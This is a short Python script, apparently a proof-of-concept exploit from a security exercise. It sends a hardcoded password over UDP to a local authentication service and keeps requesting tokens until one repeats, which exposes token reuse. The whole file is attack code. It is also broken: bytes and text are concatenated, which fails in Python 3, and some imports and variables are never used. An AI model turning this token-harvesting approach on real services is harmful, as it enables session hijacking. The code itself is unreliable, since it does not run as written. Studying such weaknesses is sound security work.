#Vulnerability Name - Same Token Generation
import socket
import random
import string

def findSameToken(p) :
    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    foundSameToken = False

    s.sendto(b"AUTH " + "!Q#E%T&U8i6y4r2w", ("127.0.0.1", p))
    token1, addr = s.recvfrom(1024)

    while foundSameToken == False:
        s.sendto(b"AUTH " + "!Q#E%T&U8i6y4r2w", ("127.0.0.1", p))
        token2, addr = s.recvfrom(1024)
        print("trying token: " + token2)
        if(token1 == token2):
            foundSameToken = True
    return token2

try:
    
    infPort = 23456
    incPort = 23457
    incToken = findSameToken(incPort)
    assert(incToken != None)
except Exception as ex:
    print (ex)